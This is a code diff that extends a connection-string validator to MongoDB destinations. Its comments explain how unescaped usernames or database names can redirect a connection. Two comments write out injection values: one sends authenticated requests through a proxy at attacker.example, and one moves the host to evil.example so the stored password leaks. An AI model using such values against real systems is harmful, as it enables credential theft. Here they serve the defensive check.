@@ -312,6 +312,12 @@ function findChangedTargets(node: any, original: any, path: (string | number)[],
 //   the query string, so `events?http_proxy=http://attacker.example:8080` sets a driver option that carries the
 //   authenticated requests through that proxy, and a `#` cuts the name and drops the parameters after it. An `&` before
 //   the first `?` is plain path text (checked against clickhouse-go 2.45.0), so `R&D` is a valid name.
+// - MongoDB (rotor, not Bulker): `protocol://username:password@hosts/database?options`, concatenated with no escaping
+//   (services/rotor/src/lib/mongodb-destination.ts). An `@` in the username ends the credentials early, so
+//   `x:y@evil.example:27017/?appName=` moves the host, and the stored password follows as the value of `appName`. A `?`
+//   in the database starts the options (`authMechanism=PLAIN`, `proxyHost`), and a `#` cuts the rest. Checked against the
+//   mongodb driver 7.1.1 (parse only). rotor does not percent-encode the values and neither does this check: a stored
+//   value may already be encoded for the driver, and encoding it again would break a working connection.
 // Bulker now quotes or avoids the string (JITSU-270; ClickHouse is not covered there), but a console talking to an older
 // Bulker must not rely on that.
 const CONNECTION_STRING_TYPES: Record<string, { fields: string[]; breaker: RegExp; what: string }> = {
@@ -327,10 +333,11 @@ const CONNECTION_STRING_TYPES: Record<string, { fields: string[]; breaker: RegEx
   },
   mysql: { fields: ["database"], breaker: /[@/?]/, what: "@, / or ?" },
   clickhouse: { fields: ["database"], breaker: /[?#]/, what: "? or #" },
+  mongodb: { fields: ["username", "database"], breaker: /[@/?#]/, what: "@, /, ? or #" },
 };
 
 /**
- * Fields of a Postgres, Redshift, MySQL or ClickHouse destination whose value would split or move the connection string, and what
+ * Fields of a Postgres, Redshift, MySQL, ClickHouse or MongoDB destination whose value would split or move the connection string, and what
  * is wrong with them. Whitespace at either end is ignored: it cannot start a setting (the Postgres reader skips it
  * after `=` and ends the value at it), and a stored schema with a leading space exists in production and has always
  * worked.
